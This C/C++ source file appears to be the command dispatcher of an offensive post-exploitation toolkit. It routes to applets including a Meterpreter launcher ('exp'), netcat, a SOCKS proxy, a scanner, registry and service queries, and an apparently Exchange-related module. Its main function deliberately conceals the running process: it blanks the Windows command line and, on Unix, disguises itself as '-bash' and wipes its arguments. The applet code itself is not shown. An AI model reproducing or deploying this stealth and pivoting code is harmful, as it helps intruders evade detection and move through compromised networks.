#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

void help();
#ifdef WIN32
#include <windows.h>
int ps_main(int argc, char* argv[]);
int kill_main(int argc, char* argv[]);
int whoami_main(int argc, char* argv[]);
extern "C" int reg_main(int argc, char* argv[]);
extern "C" int scquery_main(int argc, char* argv[]);
int meterpreter_main(int argc, char* argv[]);
#endif
extern "C" int nc_main(int argc, char* argv[]);
int socks_main(int argc, char* argv[]);
extern "C" int scan_main(int argc, char* argv[]);
extern "C" int exch_main(int argc, char* argv[]);

typedef struct _applet_desc {
	const char* name;
	int (*entry)(int argc, char* argv[]);
	const char* desc;
} applet_desc;

applet_desc applets[] = {
#ifdef WIN32
	{"ps", ps_main, NULL}, 
	{"whoami", whoami_main, NULL},
	{"kill", kill_main, NULL},
	{"reg", reg_main, NULL}, 
	{"scquery", scquery_main, NULL}, 
	{"exp", meterpreter_main, NULL}, 
#endif
	{"nc", nc_main, NULL}, 
	{"socks", socks_main, NULL},
	{"scan", scan_main, NULL}, 
	{"exch", exch_main, NULL}, 
};

int main(int argc, char* argv[])
{
	if (argc <= 1) {
		help();
		return -1;
	}

#ifdef _WIN32
	char** _argv = argv;
	// GetCommandLineW() return the address and modify it
	// xp is worked, TODO: test win7
	// rename the exe to hide itself.
	wchar_t *cmdline = GetCommandLineW();
	cmdline[0] = 0;
#else
	// hide me in *nix
	char** _argv = new char*[argc + 1];
	_argv[argc] = 0;
	for (int i = 0; i < argc; i ++) {
		_argv[i] = strdup(argv[i]); // dont free
		if (i == 0)
			strcpy(argv[i], "-bash");
		else
			argv[i][0] = 0;
	}
#endif
	srand((unsigned int)time(NULL));
	
	for (int i = 0; i < sizeof(applets) / sizeof(applets[0]); i ++) {
		if (strcmp(applets[i].name, _argv[1]) == 0) {
			return applets[i].entry(argc - 1, &_argv[1]);
		}
	}
	help();
	return -1;
}

void help()
{
	printf("help msg\n");
}

